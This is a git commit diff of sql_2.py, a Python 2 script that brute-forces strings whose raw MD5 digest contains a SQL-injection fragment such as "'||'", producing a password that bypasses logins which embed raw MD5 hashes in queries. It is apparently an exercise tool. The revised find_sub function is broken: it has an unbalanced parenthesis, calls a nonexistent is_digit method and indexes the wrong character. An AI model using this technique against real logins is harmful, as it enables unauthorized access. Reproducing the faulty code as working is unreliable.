9f0e463bc4edf933527e20eba3212c439fa341ca
ryanmars <ryanmars@umich.edu>
2018-02-08 14:18:59 -0500

    More efficient search

--- sql_2.py
+++ sql_2.py
@@ -4,16 +4,20 @@ import random
 import string
 
 def find_sub(text):
-	return ((text.find("'or'1") != -1) or (text.find("'||'1") != -1))
+	or_found_idx = (text.find("'||'")
+	return text[or_found_idx].is_digit()
 
+i = 0
 string_found = 0
 
 while not string_found:
 	text = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(40)])
 	md5_text = md5(text)
-	md5_text = urllib.quote(md5_text.digest())
-	string_found = find_sub(md5_text);
-
+	md5_text = md5_text.digest()
+	string_found = find_sub(md5_text)
+	i += 1
+	if (i % 1000000 == 0):
+		print i
 
 print "Password = ", text
 print "Hashed Password = ", md5_text
